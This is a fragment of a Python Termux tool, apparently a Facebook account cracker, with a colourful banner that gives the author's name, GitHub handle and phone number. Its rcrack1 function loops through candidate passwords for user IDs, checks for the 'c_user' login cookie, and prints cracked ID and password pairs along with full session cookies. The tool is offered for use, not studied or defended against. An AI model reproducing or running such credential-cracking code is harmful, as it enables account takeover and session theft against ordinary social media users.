...
\033[1;33m╔═══════════════════════════════════════════════╗
║\033[1;32m🌺WELLCOME TO SAJIB TERMUX COMMAND WORLD 2.0🌺\033[1;33m║
╚═══════════════════════════════════════════════╝                                             
\033[32;1m╔═══════════════════════════════════════════════╗
\033[33;1m║ ╔═══════════════════════════════════════════╗ ║
\033[34;1m║ ║❤︎[❥] 𝐓𝐎𝐎𝐋 𝐍𝐀𝐌𝐄     : \033[31;1m\033[32;1m 𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇           ║ ║
\033[35;1m║ ║❤︎[❥] 𝐓𝐎𝐎𝐋 𝐂𝐑𝐄𝐀𝐓𝐄𝐃  : \033[32;1m\033[33;1m 𝐒𝐀𝐉𝐈𝐁 𝐈𝐒𝐋𝐀𝐌          ║ ║
\033[36;1m║ ║❤︎[❥] 𝐆𝐈𝐓𝐇𝐔𝐁   : \033[33;1m\033[34;1m 𝐒𝐀𝐉𝐈𝐁8283             \033[34;1m    ║ ║
\033[35;1m║ ║❤︎[❥] 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏      : \033[32;1m\033[33;1m +8801703538283       ║ ║
\033[37;1m║ ║❤︎[❥] F𝐀𝐂𝐄𝐁𝐎𝐎𝐊      : \033[34;1m 𝐒𝐀𝐉𝐈𝐁 𝐈𝐒𝐋𝐀𝐌   \033[35;1m       ║ ║
\033[38;1m║ ║❤︎[❥] 𝐒𝐓𝐀𝐓𝐔𝐒        : \033[33;1m\033[32;1m 𝐏𝐑𝐄𝐌𝐈𝐔𝐌          \033[34;1m    ║ ║
\033[32;1m║ ║❤︎[❥] 𝐕𝐄𝐑𝐒𝐈𝐎𝐍       : \033[35;1m\033[1;91m 5.8                  ║ ║
\033[33;1m║ ╚═══════════════════════════════════════════╝ ║
\033[34;1m╚═══════════════════════════════════════════════╝""")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mSAJIB\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[SAJIB-OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[𝐒𝐀𝐉𝐈𝐁] {cid} | {ps}")
                ...
                continue
        loop+=1
        #sys.stdout.write(f'\r\033[m[𝐒𝐀𝐉𝐈𝐁] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        #sys.stdout.flush()
    except:
        pass
Main()
